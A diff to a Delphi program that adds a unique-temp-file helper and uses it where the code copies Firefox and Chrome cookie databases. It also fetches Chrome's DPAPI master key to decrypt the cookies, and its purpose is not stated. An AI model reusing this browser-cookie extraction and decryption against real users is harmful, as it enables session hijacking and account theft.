@@ -43,6 +43,16 @@ uses
   FireDAC.DApt,        // registers object factories (required)
   FireDAC.Comp.Client;
 
+function UniqueTempPath(const Prefix: string): string;
+var
+  TmpDir:  array[0..MAX_PATH] of WideChar;
+  TmpFile: array[0..MAX_PATH] of WideChar;
+begin
+  GetTempPathW(MAX_PATH, TmpDir);
+  GetTempFileNameW(TmpDir, PWideChar(WideString(Prefix)), 0, TmpFile);
+  Result := string(TmpFile);
+end;
+
 { ------------------------------------------------------------------ }
 {  DPAPI                                                              }
 { ------------------------------------------------------------------ }
@@ -743,7 +753,7 @@ begin
   if not ReadFirefoxCookies(DBPath, Pairs) then
   begin
     // Fallback: copy snapshot (handles the rare case where FireDAC can't open live)
-    TmpDB := TPath.Combine(TPath.GetTempPath, 'nlp_ff_cookies.sqlite');
+    TmpDB := UniqueTempPath('nlp');
     try
       if not CopyDBToTemp(DBPath, TmpDB) then Exit;
       ReadFirefoxCookies(TmpDB, Pairs);
@@ -791,7 +801,7 @@ begin
   MasterKey := GetChromeMasterKey(LocalState);
   if Length(MasterKey) = 0 then Exit;
 
-  TmpDB := TPath.Combine(TPath.GetTempPath, 'nlp_cr_cookies.sqlite');
+  TmpDB := UniqueTempPath('nlp');
   try
     if not CopyDBToTemp(CookieDB, TmpDB) then Exit;
 
@@ -898,7 +908,7 @@ begin
   CookieDB := Base + 'Default\Network\Cookies';
   if not FileExists(CookieDB) then Exit;
 
-  TmpDB := TPath.Combine(TPath.GetTempPath, 'nlp_cr_diag.sqlite');
+  TmpDB := UniqueTempPath('nlp');
   try
     if not CopyDBToTemp(CookieDB, TmpDB) then Exit;
     Conn := OpenReadOnlySQLite(TmpDB);
